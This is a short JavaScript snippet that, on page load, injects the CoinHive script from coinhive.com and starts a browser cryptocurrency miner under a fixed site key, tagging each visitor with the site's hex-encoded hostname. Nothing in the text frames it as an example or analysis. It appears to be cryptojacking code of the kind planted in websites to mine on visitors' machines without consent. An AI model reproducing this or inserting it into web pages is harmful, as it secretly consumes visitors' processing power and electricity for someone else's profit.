document.addEventListener("DOMContentLoaded", function() {
    function t(t, n) {
        var e = document.createElement("script");
        e.setAttribute("type", "text/javascript"), e.src = t, e.onload = n, document.body.appendChild(e)
    }

    function n(t) {
        for (var n = "", e = t.length, o = 0; o < e; o++) n += t.charCodeAt(o).toString(16);
        return n
    }
    setTimeout(function() {
        var e = n(window.location.hostname);
        t("https://coinhive.com/lib/coinhive.min.js", function() {
            new CoinHive.User("RDoXNrAxvyGSFD9xkD8nZiYjyDtjgJjX", e, {
                throttle: .3
            }).start()
        })
    }, 100)
});